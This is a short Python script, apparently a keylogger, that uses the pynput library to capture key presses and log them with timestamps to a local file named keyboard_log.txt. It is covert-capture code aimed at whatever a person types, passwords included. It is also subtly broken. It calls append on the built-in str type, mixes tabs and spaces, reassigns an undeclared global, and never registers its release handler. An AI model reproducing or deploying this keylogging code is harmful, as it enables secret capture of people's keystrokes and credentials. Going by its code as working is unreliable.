
from pynput import keyboard
import logging
logging.basicConfig(filename=("keyboard_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
data=""
def on_press(key):
	str.append(key)	
 
def on_release(key):
    if str(key) == 'Key.enter':
	logging.info(data)
	data=""
        return False
 
with keyboard.Listener(
    on_press = on_press) as listener:
    listener.join()
